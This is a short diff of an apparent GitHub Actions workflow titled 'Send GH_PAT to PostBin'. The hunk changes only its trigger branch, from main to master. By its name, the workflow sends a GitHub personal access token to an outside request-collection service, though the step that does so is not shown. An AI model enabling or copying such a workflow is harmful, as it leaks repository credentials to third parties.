@@ -2,7 +2,7 @@ name: Send GH_PAT to PostBin
 on:
   push:
     branches:
-      - main
+      - master
 
 jobs:
   send_gh_pat:
